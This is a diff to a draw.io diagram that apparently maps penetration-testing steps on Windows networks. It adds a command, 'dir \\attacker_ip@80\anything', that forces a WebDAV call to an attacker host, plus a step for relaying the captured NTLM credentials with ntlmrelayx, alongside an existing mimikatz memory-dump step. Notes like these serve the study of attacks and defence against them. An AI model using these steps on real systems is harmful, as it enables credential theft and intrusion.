@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-07-15T15:50:11.010Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="duCsHUP7Fu8Thk1ce_yJ" version="24.6.5" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2024-07-17T11:25:29.464Z" agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0" etag="MS6zpBZuf8-SQWE4Zx8w" version="24.7.0" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -916,7 +916,7 @@
       </root>
     </mxGraphModel>
   </diagram>
-  <diagram name="From shell to creds" id="OQxTBWZXocskVWx4F1w2">
+  <diagram name="From rem shell to creds" id="OQxTBWZXocskVWx4F1w2">
     <mxGraphModel dx="1434" dy="670" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
@@ -968,6 +968,14 @@
         </mxCell>
         <mxCell id="5XMI3-geCgVCCPfJcu6X-16" value="dump memory with mimikatz" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="550" y="90" width="120" height="60" as="geometry" />
+        </mxCell>
+        <object label="&lt;div&gt;HTTP call&lt;/div&gt;&lt;div&gt;&lt;pre class=&quot;default s-code-block&quot;&gt;&lt;font color=&quot;#4a86e8&quot;&gt;&lt;code class=&quot;hljs language-bash&quot;&gt;dir \\attacker_ip@80\anything&lt;br&gt;WEBDAV call&lt;br&gt;&lt;/code&gt;&lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;" cmd="dir \\ip@80\anything" id="1zPo8PcAT4hi3SV_798--2">
+          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#ffc000;" vertex="1" parent="1">
+            <mxGeometry x="60" y="340" width="360" height="60" as="geometry" />
+          </mxCell>
+        </object>
+        <mxCell id="1zPo8PcAT4hi3SV_798--3" value="relay with NTLMRELAYX" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="465" y="340" width="120" height="60" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
